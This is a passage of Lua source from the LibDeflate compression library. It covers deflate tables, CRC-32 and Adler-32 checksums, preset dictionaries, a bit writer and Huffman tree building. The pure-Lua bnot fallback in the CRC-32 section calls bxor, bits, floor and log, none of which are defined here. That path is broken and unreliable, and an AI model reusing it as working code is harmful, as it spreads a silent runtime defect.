	0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2,
	3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 0,
}

-- Convert a distance deflate code to base LZ77 distance. (0<=code<=29)
local _dist_deflate_code_to_base_dist = {
	[0] = 1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193,
	257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145,
	8193, 12289, 16385, 24577,
}

-- Convert a distance deflate code to LZ77 bits length. (0<=code<=29)
local _dist_deflate_code_to_extra_bitlen = {
	[0] = 0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6,
	7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13,
}

-- The code order of the first huffman header in the dynamic deflate block.
-- See the page 12 of RFC1951
local _rle_codes_huffman_bitlen_order = {16, 17, 18,
	0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15,
}

-- The following tables are used by fixed deflate block.
-- The value of these tables are assigned at the bottom of the source.

-- The huffman code of the literal/LZ77_length deflate codes,
-- in fixed deflate block.
local _fix_block_literal_huffman_code

-- Convert huffman code of the literal/LZ77_length to deflate codes,
-- in fixed deflate block.
local _fix_block_literal_huffman_to_deflate_code

-- The bit length of the huffman code of literal/LZ77_length deflate codes,
-- in fixed deflate block.
local _fix_block_literal_huffman_bitlen

-- The count of each bit length of the literal/LZ77_length deflate codes,
-- in fixed deflate block.
local _fix_block_literal_huffman_bitlen_count

-- The huffman code of the distance deflate codes,
-- in fixed deflate block.
local _fix_block_dist_huffman_code

-- Convert huffman code of the distance to deflate codes,
-- in fixed deflate block.
local _fix_block_dist_huffman_to_deflate_code

-- The bit length of the huffman code of the distance deflate codes,
-- in fixed deflate block.
local _fix_block_dist_huffman_bitlen

-- The count of each bit length of the huffman code of
-- the distance deflate codes,
-- in fixed deflate block.
local _fix_block_dist_huffman_bitlen_count

for i = 0, 255 do
	_byte_to_char[i] = string_char(i)
end

do
	local pow = 1
	for i = 0, 32 do
		_pow2[i] = pow
		pow = pow * 2
	end
end

for i = 1, 9 do
	_reverse_bits_tbl[i] = {}
	for j=0, _pow2[i+1]-1 do
		local reverse = 0
		local value = j
		for _ = 1, i do
			-- The following line is equivalent to ""res | (code %2)"" in C.
			reverse = reverse - reverse%2
				+ (((reverse%2==1) or (value % 2) == 1) and 1 or 0)
			value = (value-value%2)/2
			reverse = reverse * 2
		end
		_reverse_bits_tbl[i][j] = (reverse-reverse%2)/2
	end
end

-- The source code is written according to the pattern in the numbers
-- in RFC1951 Page10.
do
	local a = 18
	local b = 16
	local c = 265
	local bitlen = 1
	for len = 3, 258 do
		if len <= 10 then
			_length_to_deflate_code[len] = len + 254
			_length_to_deflate_extra_bitlen[len] = 0
		elseif len == 258 then
			_length_to_deflate_code[len] = 285
			_length_to_deflate_extra_bitlen[len] = 0
		else
			if len > a then
				a = a + b
				b = b * 2
				c = c + 4
				bitlen = bitlen + 1
			end
			local t = len-a-1+b/2
			_length_to_deflate_code[len] = (t-(t%(b/8)))/(b/8) + c
			_length_to_deflate_extra_bitlen[len] = bitlen
			_length_to_deflate_extra_bits[len] = t % (b/8)
		end
	end
end

-- The source code is written according to the pattern in the numbers
-- in RFC1951 Page11.
do
	_dist256_to_deflate_code[1] = 0
	_dist256_to_deflate_code[2] = 1
	_dist256_to_deflate_extra_bitlen[1] = 0
	_dist256_to_deflate_extra_bitlen[2] = 0

	local a = 3
	local b = 4
	local code = 2
	local bitlen = 0
	for dist = 3, 256 do
		if dist > b then
			a = a * 2
			b = b * 2
			code = code + 2
			bitlen = bitlen + 1
		end
		_dist256_to_deflate_code[dist] = (dist <= a) and code or (code+1)
		_dist256_to_deflate_extra_bitlen[dist] = (bitlen < 0) and 0 or bitlen
		if b >= 8 then
			_dist256_to_deflate_extra_bits[dist] = (dist-b/2-1) % (b/4)
		end
	end
end

-- CRC-16/CRC-32 computation
local band, bnot, xor, lshift, rshift

if bit ~= nil then
    band = bit.band
    bnot = bit.bnot
    xor = bit.bxor
    lshift = bit.blshift
    rshift = bit.blogic_rshift
elseif bit32 ~= nil then
    band = bit32.band
    bnot = bit32.bnot
    xor = bit32.bxor
    lshift = bit32.lshift
    rshift = bit32.rshift
else
    xor = function(a, b)
        local calc = 0    
    
        for i = 32, 0, -1 do
        local val = 2 ^ i
        local aa = false
        local bb = false
    
        if a == 0 then
            calc = calc + b
            break
        end
    
        if b == 0 then
            calc = calc + a
            break
        end
    
        if a >= val then
            aa = true
            a = a - val
        end
    
        if b >= val then
            bb = true
            b = b - val
        end
    
        if not (aa and bb) and (aa or bb) then
            calc = calc + val
        end
        end
    
        return calc
    end
    
    lshift = function(num, left)
        local res = num * (2 ^ left)
        return res % (2 ^ 32)
    end
    
    rshift = function(num, right)
        local res = num / (2 ^ right)
        return math.floor(res)
    end
    
    band = function(a, b)
        local p,c=1,0
        while a>0 and b>0 do
            local ra,rb=a%2,b%2
            if ra+rb>1 then c=c+p end
            a,b,p=(a-ra)/2,(b-rb)/2,p*2
        end
        return c
    end

    bnot = function(x)
        return bxor(x, (2^(bits or floor(log(x, 2))))-1)
    end
end

-- CRC-32-IEEE 802.3 (V.42)
local POLY = 0xEDB88320

-- Memoize function pattern (like http://lua-users.org/wiki/FuncTables ).
local function memoize(f)
  local mt = {}
  local t = setmetatable({}, mt)
  function mt:__index(k)
    local v = f(k); t[k] = v
    return v
  end
  return t
end

-- CRC table.
local crc_table = memoize(function(i)
  local crc = i
  for _=1,8 do
    local b = band(crc, 1)
    crc = rshift(crc, 1)
    if b == 1 then crc = xor(crc, POLY) end
  end
  return crc
end)


local function crc32_byte(byte, crc)
  crc = bnot(crc or 0)
  local v1 = rshift(crc, 8)
  local v2 = crc_table[xor(crc % 256, byte)]
  return bnot(xor(v1, v2))
end


local function crc32_string(s, crc)
  crc = crc or 0
  for i=1,#s do
    crc = crc32_byte(s:byte(i), crc)
  end
  return crc
end

--- Calculate the CRC-32 checksum of the string.
-- @param s [string] the input string to calculate its CRC-32 checksum.
-- @return [integer] The CRC-32 checksum, which is greater or equal to 0,
-- and less than 2^32 (4294967296).
function LibDeflate:CRC32(s, crc)
  if type(s) == 'string' then
    return crc32_string(s, crc)
  else
    return crc32_byte(s, crc)
  end
end

--- Calculate the Adler-32 checksum of the string. <br>
-- See RFC1950 Page 9 https://tools.ietf.org/html/rfc1950 for the
-- definition of Adler-32 checksum.
-- @param str [string] the input string to calcuate its Adler-32 checksum.
-- @return [integer] The Adler-32 checksum, which is greater or equal to 0,
-- and less than 2^32 (4294967296).
function LibDeflate:Adler32(str)
	-- This function is loop unrolled by better performance.
	--
	-- Here is the minimum code:
	--
	-- local a = 1
	-- local b = 0
	-- for i=1, #str do
	-- 		local s = string.byte(str, i, i)
	-- 		a = (a+s)%65521
	-- 		b = (b+a)%65521
	-- 		end
	-- return b*65536+a
	if type(str) ~= ""string"" then
		error((""Usage: LibDeflate:Adler32(str):""
			.."" 'str' - string expected got '%s'.""):format(type(str)), 2)
	end
	local strlen = #str

	local i = 1
	local a = 1
	local b = 0
	while i <= strlen - 15 do
		local x1, x2, x3, x4, x5, x6, x7, x8,
			x9, x10, x11, x12, x13, x14, x15, x16 = string_byte(str, i, i+15)
		b = (b+16*a+16*x1+15*x2+14*x3+13*x4+12*x5+11*x6+10*x7+9*x8+8*x9
			+7*x10+6*x11+5*x12+4*x13+3*x14+2*x15+x16)%65521
		a = (a+x1+x2+x3+x4+x5+x6+x7+x8+x9+x10+x11+x12+x13+x14+x15+x16)%65521
		i =  i + 16
	end
	while (i <= strlen) do
		local x = string_byte(str, i, i)
		a = (a + x) % 65521
		b = (b + a) % 65521
		i = i + 1
	end
	return (b*65536+a) % 4294967296
end

-- Compare adler32 checksum.
-- adler32 should be compared with a mod to avoid sign problem
-- 4072834167 (unsigned) is the same adler32 as -222133129
local function IsEqualAdler32(actual, expected)
	return (actual % 4294967296) == (expected % 4294967296)
end

--- Create a preset dictionary.
--
-- This function is not fast, and the memory consumption of the produced
-- dictionary is about 50 times of the input string. Therefore, it is suggestted
-- to run this function only once in your program.
--
-- It is very important to know that if you do use a preset dictionary,
-- compressors and decompressors MUST USE THE SAME dictionary. That is,
-- dictionary must be created using the same string. If you update your program
-- with a new dictionary, people with the old version won't be able to transmit
-- data with people with the new version. Therefore, changing the dictionary
-- must be very careful.
--
-- The parameters ""strlen"" and ""adler32"" add a layer of verification to ensure
-- the parameter ""str"" is not modified unintentionally during the program
-- development.
--
-- @usage local dict_str = ""1234567890""
--
-- -- print(dict_str:len(), LibDeflate:Adler32(dict_str))
-- -- Hardcode the print result below to verify it to avoid acciently
-- -- modification of 'str' during the program development.
-- -- string length: 10, Adler-32: 187433486,
-- -- Don't calculate string length and its Adler-32 at run-time.
--
-- local dict = LibDeflate:CreateDictionary(dict_str, 10, 187433486)
--
-- @param str [string] The string used as the preset dictionary. <br>
-- You should put stuffs that frequently appears in the dictionary
-- string and preferablely put more frequently appeared stuffs toward the end
-- of the string. <br>
-- Empty string and string longer than 32768 bytes are not allowed.
-- @param strlen [integer] The length of 'str'. Please pass in this parameter
-- as a hardcoded constant, in order to verify the content of 'str'. The value
-- of this parameter should be known before your program runs.
-- @param adler32 [integer] The Adler-32 checksum of 'str'. Please pass in this
-- parameter as a hardcoded constant, in order to verify the content of 'str'.
-- The value of this parameter should be known before your program runs.
-- @return  [table] The dictionary used for preset dictionary compression and
-- decompression.
-- @raise error if 'strlen' does not match the length of 'str',
-- or if 'adler32' does not match the Adler-32 checksum of 'str'.
function LibDeflate:CreateDictionary(str, strlen, adler32)
	if type(str) ~= ""string"" then
		error((""Usage: LibDeflate:CreateDictionary(str, strlen, adler32):""
			.."" 'str' - string expected got '%s'.""):format(type(str)), 2)
	end
	if type(strlen) ~= ""number"" then
		error((""Usage: LibDeflate:CreateDictionary(str, strlen, adler32):""
			.."" 'strlen' - number expected got '%s'.""):format(
			type(strlen)), 2)
	end
	if type(adler32) ~= ""number"" then
		error((""Usage: LibDeflate:CreateDictionary(str, strlen, adler32):""
			.."" 'adler32' - number expected got '%s'.""):format(
			type(adler32)), 2)
	end
	if strlen ~= #str then
		error((""Usage: LibDeflate:CreateDictionary(str, strlen, adler32):""
				.."" 'strlen' does not match the actual length of 'str'.""
				.."" 'strlen': %u, '#str': %u .""
				.."" Please check if 'str' is modified unintentionally."")
			:format(strlen, #str))
	end
	if strlen == 0 then
		error((""Usage: LibDeflate:CreateDictionary(str, strlen, adler32):""
			.."" 'str' - Empty string is not allowed.""), 2)
	end
	if strlen > 32768 then
		error((""Usage: LibDeflate:CreateDictionary(str, strlen, adler32):""
			.."" 'str' - string longer than 32768 bytes is not allowed.""
			 .."" Got %d bytes.""):format(strlen), 2)
	end
	local actual_adler32 = self:Adler32(str)
	if not IsEqualAdler32(adler32, actual_adler32) then
		error((""Usage: LibDeflate:CreateDictionary(str, strlen, adler32):""
				.."" 'adler32' does not match the actual adler32 of 'str'.""
				.."" 'adler32': %u, 'Adler32(str)': %u .""
				.."" Please check if 'str' is modified unintentionally."")
			:format(adler32, actual_adler32))
	end

	local dictionary = {}
	dictionary.adler32 = adler32
	dictionary.hash_tables = {}
	dictionary.string_table = {}
	dictionary.strlen = strlen
	local string_table = dictionary.string_table
	local hash_tables = dictionary.hash_tables
	string_table[1] = string_byte(str, 1, 1)
	string_table[2] = string_byte(str, 2, 2)
	if strlen >= 3 then
		local i = 1
		local hash = string_table[1]*256+string_table[2]
		while i <= strlen - 2 - 3 do
			local x1, x2, x3, x4 = string_byte(str, i+2, i+5)
			string_table[i+2] = x1
			string_table[i+3] = x2
			string_table[i+4] = x3
			string_table[i+5] = x4
			hash = (hash*256+x1)%16777216
			local t = hash_tables[hash]
			if not t then t = {}; hash_tables[hash] = t end
			t[#t+1] = i-strlen
			i = i + 1
			hash = (hash*256+x2)%16777216
			t = hash_tables[hash]
			if not t then t = {}; hash_tables[hash] = t end
			t[#t+1] = i-strlen
			i = i + 1
			hash = (hash*256+x3)%16777216
			t = hash_tables[hash]
			if not t then t = {}; hash_tables[hash] = t end
			t[#t+1] = i-strlen
			i = i + 1
			hash = (hash*256+x4)%16777216
			t = hash_tables[hash]
			if not t then t = {}; hash_tables[hash] = t end
			t[#t+1] = i-strlen
			i = i + 1
		end
		while i <= strlen - 2 do
			local x = string_byte(str, i+2)
			string_table[i+2] = x
			hash = (hash*256+x)%16777216
			local t = hash_tables[hash]
			if not t then t = {}; hash_tables[hash] = t end
			t[#t+1] = i-strlen
			i = i + 1
		end
	end
	return dictionary
end

-- Check if the dictionary is valid.
-- @param dictionary The preset dictionary for compression and decompression.
-- @return true if valid, false if not valid.
-- @return if not valid, the error message.
local function IsValidDictionary(dictionary)
	if type(dictionary) ~= ""table"" then
		return false, (""'dictionary' - table expected got '%s'."")
			:format(type(dictionary))
	end
	if type(dictionary.adler32) ~= ""number""
		or type(dictionary.string_table) ~= ""table""
		or type(dictionary.strlen) ~= ""number""
		or dictionary.strlen <= 0
		or dictionary.strlen > 32768
		or dictionary.strlen ~= #dictionary.string_table
		or type(dictionary.hash_tables) ~= ""table""
		then
		return false, (""'dictionary' - corrupted dictionary."")
			:format(type(dictionary))
	end
	return true, """"
end

--[[
	key of the configuration table is the compression level,
	and its value stores the compression setting.
	These numbers come from zlib source code.

	Higher compression level usually means better compression.
	(Because LibDeflate uses a simplified version of zlib algorithm,
	there is no guarantee that higher compression level does not create
	bigger file than lower level, but I can say it's 99% likely)

	Be careful with the high compression level. This is a pure lua
	implementation compressor/decompressor, which is significant slower than
	a C/C++ equivalant compressor/decompressor. Very high compression level
	costs significant more CPU time, and usually compression size won't be
	significant smaller when you increase compression level by 1, when the
	level is already very high. Benchmark yourself if you can afford it.

	See also https://github.com/madler/zlib/blob/master/doc/algorithm.txt,
	https://github.com/madler/zlib/blob/master/deflate.c for more information.

	The meaning of each field:
	@field 1 use_lazy_evaluation:
		true/false. Whether the program uses lazy evaluation.
		See what is ""lazy evaluation"" in the link above.
		lazy_evaluation improves ratio, but relatively slow.
	@field 2 good_prev_length:
		Only effective if lazy is set, Only use 1/4 of max_chain,
		if prev length of lazy match is above this.
	@field 3 max_insert_length/max_lazy_match:
		If not using lazy evaluation,
		insert new strings in the hash table only if the match length is not
		greater than this length.
		If using lazy evaluation, only continue lazy evaluation,
		if previous match length is strictly smaller than this value.
	@field 4 nice_length:
		Number. Don't continue to go down the hash chain,
		if match length is above this.
	@field 5 max_chain:
		Number. The maximum number of hash chains we look.
--]]
local _compression_level_configs = {
	[0] = {false, nil, 0, 0, 0}, -- level 0, no compression
	[1] = {false, nil, 4, 8, 4}, -- level 1, similar to zlib level 1
	[2] = {false, nil, 5, 18, 8}, -- level 2, similar to zlib level 2
	[3] = {false, nil, 6, 32, 32},	-- level 3, similar to zlib level 3
	[4] = {true, 4,	4, 16, 16},	-- level 4, similar to zlib level 4
	[5] = {true, 8,	16,	32,	32}, -- level 5, similar to zlib level 5
	[6] = {true, 8,	16,	128, 128}, -- level 6, similar to zlib level 6
	[7] = {true, 8,	32,	128, 256}, -- (SLOW) level 7, similar to zlib level 7
	[8] = {true, 32, 128, 258, 1024} , --(SLOW) level 8,similar to zlib level 8
	[9] = {true, 32, 258, 258, 4096},
		-- (VERY SLOW) level 9, similar to zlib level 9
}

-- Check if the compression/decompression arguments is valid
-- @param str The input string.
-- @param check_dictionary if true, check if dictionary is valid.
-- @param dictionary The preset dictionary for compression and decompression.
-- @param check_configs if true, check if config is valid.
-- @param configs The compression configuration table
-- @return true if valid, false if not valid.
-- @return if not valid, the error message.
local function IsValidArguments(str,
	check_dictionary, dictionary,
	check_configs, configs)

	if type(str) ~= ""string"" then
		return false,
			(""'str' - string expected got '%s'.""):format(type(str))
	end
	if check_dictionary then
		local dict_valid, dict_err = IsValidDictionary(dictionary)
		if not dict_valid then
			return false, dict_err
		end
	end
	if check_configs then
		local type_configs = type(configs)
		if type_configs ~= ""nil"" and type_configs ~= ""table"" then
			return false,
			(""'configs' - nil or table expected got '%s'."")
				:format(type(configs))
		end
		if type_configs == ""table"" then
			for k, v in pairs(configs) do
				if k ~= ""level"" and k ~= ""strategy"" then
					return false,
					(""'configs' - unsupported table key in the configs: '%s'."")
					:format(k)
				elseif k == ""level"" and not _compression_level_configs[v] then
					return false,
					(""'configs' - unsupported 'level': %s.""):format(tostring(v))
				elseif k == ""strategy"" and v ~= ""fixed"" and v ~= ""huffman_only""
						and v ~= ""dynamic"" then
						-- random_block_type is for testing purpose
					return false, (""'configs' - unsupported 'strategy': '%s'."")
						:format(tostring(v))
				end
			end
		end
	end
	return true, """"
end



--[[ --------------------------------------------------------------------------
	Compress code
--]] --------------------------------------------------------------------------

-- partial flush to save memory
local _FLUSH_MODE_MEMORY_CLEANUP = 0
-- full flush with partial bytes
local _FLUSH_MODE_OUTPUT = 1
-- write bytes to get to byte boundary
local _FLUSH_MODE_BYTE_BOUNDARY = 2
-- no flush, just get num of bits written so far
local _FLUSH_MODE_NO_FLUSH = 3

--[[
	Create an empty writer to easily write stuffs as the unit of bits.
	Return values:
	1. WriteBits(code, bitlen):
	2. WriteString(str):
	3. Flush(mode):
--]]
local function CreateWriter()
	local buffer_size = 0
	local cache = 0
	local cache_bitlen = 0
	local total_bitlen = 0
	local buffer = {}
	-- When buffer is big enough, flush into result_buffer to save memory.
	local result_buffer = {}

	-- Write bits with value ""value"" and bit length of ""bitlen"" into writer.
	-- @param value: The value being written
	-- @param bitlen: The bit length of ""value""
	-- @return nil
	local function WriteBits(value, bitlen)
		cache = cache + value * _pow2[cache_bitlen]
		cache_bitlen = cache_bitlen + bitlen
		total_bitlen = total_bitlen + bitlen
		-- Only bulk to buffer every 4 bytes. This is quicker.
		if cache_bitlen >= 32 then
			buffer_size = buffer_size + 1
			buffer[buffer_size] =
				_byte_to_char[cache % 256]
				.._byte_to_char[((cache-cache%256)/256 % 256)]
				.._byte_to_char[((cache-cache%65536)/65536 % 256)]
				.._byte_to_char[((cache-cache%16777216)/16777216 % 256)]
			local rshift_mask = _pow2[32 - cache_bitlen + bitlen]
			cache = (value - value%rshift_mask)/rshift_mask
			cache_bitlen = cache_bitlen - 32
		end
	end

	-- Write the entire string into the writer.
	-- @param str The string being written
	-- @return nil
	local function WriteString(str)
		for _ = 1, cache_bitlen, 8 do
			buffer_size = buffer_size + 1
			buffer[buffer_size] = string_char(cache % 256)
			cache = (cache-cache%256)/256
		end
		cache_bitlen = 0
		buffer_size = buffer_size + 1
		buffer[buffer_size] = str
		total_bitlen = total_bitlen + #str*8
	end

	-- Flush current stuffs in the writer and return it.
	-- This operation will free most of the memory.
	-- @param mode See the descrtion of the constant and the source code.
	-- @return The total number of bits stored in the writer right now.
	-- for byte boundary mode, it includes the padding bits.
	-- for output mode, it does not include padding bits.
	-- @return Return the outputs if mode is output.
	local function FlushWriter(mode)
		if mode == _FLUSH_MODE_NO_FLUSH then
			return total_bitlen
		end

		if mode == _FLUSH_MODE_OUTPUT
			or mode == _FLUSH_MODE_BYTE_BOUNDARY then
			-- Full flush, also output cache.
			-- Need to pad some bits if cache_bitlen is not multiple of 8.
			local padding_bitlen = (8 - cache_bitlen % 8) % 8

			if cache_bitlen > 0 then
				-- padding with all 1 bits, mainly because ""\000"" is not
				-- good to be tranmitted. I do this so ""\000"" is a little bit
				-- less frequent.
				cache = cache - _pow2[cache_bitlen]
					+ _pow2[cache_bitlen+padding_bitlen]
				for _ = 1, cache_bitlen, 8 do
					buffer_size = buffer_size + 1
					buffer[buffer_size] = _byte_to_char[cache % 256]
					cache = (cache-cache%256)/256
				end

				cache = 0
				cache_bitlen = 0
			end
			if mode == _FLUSH_MODE_BYTE_BOUNDARY then
				total_bitlen = total_bitlen + padding_bitlen
				return total_bitlen
			end
		end

		local flushed = table_concat(buffer)
		buffer = {}
		buffer_size = 0
		result_buffer[#result_buffer+1] = flushed

		if mode == _FLUSH_MODE_MEMORY_CLEANUP then
			return total_bitlen
		else
			return total_bitlen, table_concat(result_buffer)
		end
	end

	return WriteBits, WriteString, FlushWriter
end

-- Push an element into a max heap
-- @param heap A max heap whose max element is at index 1.
-- @param e The element to be pushed. Assume element ""e"" is a table
--  and comparison is done via its first entry e[1]
-- @param heap_size current number of elements in the heap.
--  NOTE: There may be some garbage stored in
--  heap[heap_size+1], heap[heap_size+2], etc..
-- @return nil
local function MinHeapPush(heap, e, heap_size)
	heap_size = heap_size + 1
	heap[heap_size] = e
	local value = e[1]
	local pos = heap_size
	local parent_pos = (pos-pos%2)/2

	while (parent_pos >= 1 and heap[parent_pos][1] > value) do
		local t = heap[parent_pos]
		heap[parent_pos] = e
		heap[pos] = t
		pos = parent_pos
		parent_pos = (parent_pos-parent_pos%2)/2
	end
end

-- Pop an element from a max heap
-- @param heap A max heap whose max element is at index 1.
-- @param heap_size current number of elements in the heap.
-- @return the poped element
-- Note: This function does not change table size of ""heap"" to save CPU time.
local function MinHeapPop(heap, heap_size)
	local top = heap[1]
	local e = heap[heap_size]
	local value = e[1]
	heap[1] = e
	heap[heap_size] = top
	heap_size = heap_size - 1

	local pos = 1
	local left_child_pos = pos * 2
	local right_child_pos = left_child_pos + 1

	while (left_child_pos <= heap_size) do
		local left_child = heap[left_child_pos]
		if (right_child_pos <= heap_size
			and heap[right_child_pos][1] < left_child[1]) then
			local right_child = heap[right_child_pos]
			if right_child[1] < value then
				heap[right_child_pos] = e
				heap[pos] = right_child
				pos = right_child_pos
				left_child_pos = pos * 2
				right_child_pos = left_child_pos + 1
			else
				break
			end
		else
			if left_child[1] < value then
				heap[left_child_pos] = e
				heap[pos] = left_child
				pos = left_child_pos
				left_child_pos = pos * 2
				right_child_pos = left_child_pos + 1
			else
				break
			end
		end
	end

	return top
end

-- Deflate defines a special huffman tree, which is unique once the bit length
-- of huffman code of all symbols are known.
-- @param bitlen_count Number of symbols with a specific bitlen
-- @param symbol_bitlen The bit length of a symbol
-- @param max_symbol The max symbol among all symbols,
--		which is (number of symbols - 1)
-- @param max_bitlen The max huffman bit length among all symbols.
-- @return The huffman code of all symbols.
local function GetHuffmanCodeFromBitlen(bitlen_counts, symbol_bitlens
		, max_symbol, max_bitlen)
	local huffman_code = 0
	local next_codes = {}
	local symbol_huffman_codes = {}
	for bitlen = 1, max_bitlen do
		huffman_code = (huffman_code+(bitlen_counts[bitlen-1] or 0))*2
		next_codes[bitlen] = huffman_code
	end
	for symbol = 0, max_symbol do
		local bitlen = symbol_bitlens[symbol]
		if bitlen then
			huffman_code = next_codes[bitlen]
			next_codes[bitlen] = huffman_code + 1

			-- Reverse the bits of huffman code,
			-- because most signifant bits of huffman code
			-- is stored first into the compressed data.
			-- @see RFC1951 Page5 Section 3.1.1
			if bitlen <= 9 then -- Have cached reverse for small bitlen.
				symbol_huffman_codes[symbol] =
					_reverse_bits_tbl[bitlen][huffman_code]
			else
				local reverse = 0
				for _ = 1, bitlen do
					reverse = reverse - reverse%2
						+ (((reverse%2==1)
							or (huffman_code % 2) == 1) and 1 or 0)
					huffman_code = (huffman_code-huffman_code%2)/2
					reverse = reverse*2
				end
				symbol_huffman_codes[symbol] = (reverse-reverse%2)/2
			end
		end
	end
	return symbol_huffman_codes
end

-- A helper function to sort heap elements
-- a[1], b[1] is the huffman frequency
-- a[2], b[2] is the symbol value.
local function SortByFirstThenSecond(a, b)
	return a[1] < b[1] or
		(a[1] == b[1] and a[2] < b[2])
end

-- Calculate the huffman bit length and huffman code.
-- @param symbol_count: A table whose table key is the symbol, and table value
--		is the symbol frenquency (nil means 0 frequency).
-- @param max_bitlen: See description of return value.
-- @param max_symbol: The maximum symbol
-- @return a table whose key is the symbol, and the value is the huffman bit
--		bit length. We guarantee that all bit length <= max_bitlen.
--		For 0<=symbol<=max_symbol, table value could be nil if the frequency
--		of the symbol is 0 or nil.
-- @return a table whose key is the symbol, and the value is the huffman code.
-- @return a number indicating the maximum symbol whose bitlen is not 0.
local function GetHuffmanBitlenAndCode(symbol_counts, max_bitlen, max_symbol)
	local heap_size
	local max_non_zero_bitlen_symbol = -1
	local leafs = {}
	local heap = {}
	local symbol_bitlens = {}
	local symbol_codes = {}
	local bitlen_counts = {}

	--[[
		tree[1]: weight, temporarily used as parent and bitLengths
		tree[2]: symbol
		tree[3]: left child
		tree[4]: right child
	--]]
	local number_unique_symbols = 0
	for symbol, count in pairs(symbol_counts) do
		number_unique_symbols = number_unique_symbols + 1
		leafs[number_unique_symbols] = {count, symbol}
	end

	if (number_unique_symbols == 0) then
		-- no code.
		return {}, {}, -1
	elseif (number_unique_symbols == 1) then
		-- Only one code. In this case, its huffman code
		-- needs to be assigned as 0, and bit length is 1.
		-- This is the only case that the return result
		-- represents an imcomplete huffman tree.
		local symbol = leafs[1][2]
		symbol_bitlens[symbol] = 1
		symbol_codes[symbol] = 0
		return symbol_bitlens, symbol_codes, symbol
	else
		table_sort(leafs, SortByFirstThenSecond)
		heap_size = number_unique_symbols
		for i = 1, heap_size do
			heap[i] = leafs[i]
		end

		while (heap_size > 1) do
			-- Note: pop does not change table size of heap
			local leftChild = MinHeapPop(heap, heap_size)
			heap_size = heap_size - 1
			local rightChild = MinHeapPop(heap, heap_size)
			heap_size = heap_size - 1
			local newNode =
				{leftChild[1]+rightChild[1], -1, leftChild, rightChild}
			MinHeapPush(heap, newNode, heap_size)
			heap_size = heap_size + 1
		end

		-- Number of leafs whose bit length is greater than max_len.
		local number_bitlen_overflow = 0

		-- Calculate bit length of all nodes
		local fifo = {heap[1], 0, 0, 0} -- preallocate some spaces.
		local fifo_size = 1
		local index = 1
		heap[1][1] = 0
		while (index <= fifo_size) do -- Breath first search
			local e = fifo[index]
			local bitlen = e[1]
			local symbol = e[2]
			local left_child = e[3]
			local right_child = e[4]
			if left_child then
				fifo_size = fifo_size + 1
				fifo[fifo_size] = left_child
				left_child[1] = bitlen + 1
			end
			if right_child then
				fifo_size = fifo_size + 1
				fifo[fifo_size] = right_child
				right_child[1] = bitlen + 1
			end
			index = index + 1

			if (bitlen > max_bitlen) then
				number_bitlen_overflow = number_bitlen_overflow + 1
				bitlen = max_bitlen
			end
			if symbol >= 0 then
				symbol_bitlens[symbol] = bitlen
				max_non_zero_bitlen_symbol =
					(symbol > max_non_zero_bitlen_symbol)
					and symbol or max_non_zero_bitlen_symbol
				bitlen_counts[bitlen] = (bitlen_counts[bitlen] or 0) + 1
			end
		end

		-- Resolve bit length overflow
		-- @see ZLib/trees.c:gen_bitlen(s, desc), for reference
		if (number_bitlen_overflow > 0) then
			repeat
				local bitlen = max_bitlen - 1
				while ((bitlen_counts[bitlen] or 0) == 0) do
					bitlen = bitlen - 1
				end
				-- move one leaf down the tree
				bitlen_counts[bitlen] = bitlen_counts[bitlen] - 1
				-- move one overflow item as its brother
				bitlen_counts[bitlen+1] = (bitlen_counts[bitlen+1] or 0) + 2
				bitlen_counts[max_bitlen] = bitlen_counts[max_bitlen] - 1
				number_bitlen_overflow = number_bitlen_overflow - 2
			until (number_bitlen_overflow <= 0)

			index = 1
			for bitlen = max_bitlen, 1, -1 do
				local n = bitlen_counts[bitlen] or 0
				while (n > 0) do
					local symbol = leafs[index][2]
					symbol_bitlens[symbol] = bitlen
					n = n - 1
					index = index + 1
				end
			end
		end

		symbol_codes = GetHuffmanCodeFromBitlen(bitlen_counts, symbol_bitlens,
				max_symbol, max_bitlen)
		return symbol_bitlens, symbol_codes, max_non_zero_bitlen_symbol
	end
end

-- Calculate the first huffman header in the dynamic huffman block
-- @see RFC1951 Page 12
-- @param lcode_bitlen: The huffman bit length of literal/LZ77_length.
-- @param max_non_zero_bitlen_lcode: The maximum literal/LZ77_length symbol
--		whose huffman bit length is not zero.
-- @param dcode_bitlen: The huffman bit length of LZ77 distance.
-- @param max_non_zero_bitlen_dcode: The maximum LZ77 distance symbol
--		whose huffman bit length is not zero.
-- @return The run length encoded codes.
-- @return The extra bits. One entry for each rle code that needs extra bits.
--		(code == 16 or 17 or 18).
-- @return The count of appearance of each rle codes.
local function RunLengthEncodeHuffmanBitlen(
		lcode_bitlens,
		max_non_zero_bitlen_lcode,
		dcode_bitlens,
		max_non_zero_bitlen_dcode)
	local rle_code_tblsize = 0
	local rle_codes = {}
	local rle_code_counts = {}
	local rle_extra_bits_tblsize = 0
	local rle_extra_bits = {}
	local prev = nil
	local count = 0

	-- If there is no distance code, assume one distance code of bit length 0.
	-- RFC1951: One distance code of zero bits means that
	-- there are no distance codes used at all (the data is all literals).
	max_non_zero_bitlen_dcode = (max_non_zero_bitlen_dcode < 0)
			and 0 or max_non_zero_bitlen_dcode
	local max_code = max_non_zero_bitlen_lcode+max_non_zero_bitlen_dcode+1

	for code = 0, max_code+1 do
		local len = (code <= max_non_zero_bitlen_lcode)
			and (lcode_bitlens[code] or 0)
			or ((code <= max_code)
			and (dcode_bitlens[code-max_non_zero_bitlen_lcode-1] or 0) or nil)
		if len == prev then
			count = count + 1
			if len ~= 0 and count == 6 then
				rle_code_tblsize = rle_code_tblsize + 1
				rle_codes[rle_code_tblsize] = 16
				rle_extra_bits_tblsize = rle_extra_bits_tblsize + 1
				rle_extra_bits[rle_extra_bits_tblsize] = 3
				rle_code_counts[16] = (rle_code_counts[16] or 0) + 1
				count = 0
			elseif len == 0 and count == 138 then
				rle_code_tblsize = rle_code_tblsize + 1
				rle_codes[rle_code_tblsize] = 18
				rle_extra_bits_tblsize = rle_extra_bits_tblsize + 1
				rle_extra_bits[rle_extra_bits_tblsize] = 127
				rle_code_counts[18] = (rle_code_counts[18] or 0) + 1
				count = 0
			end
		else
			if count == 1 then
				rle_code_tblsize = rle_code_tblsize + 1
				rle_codes[rle_code_tblsize] = prev
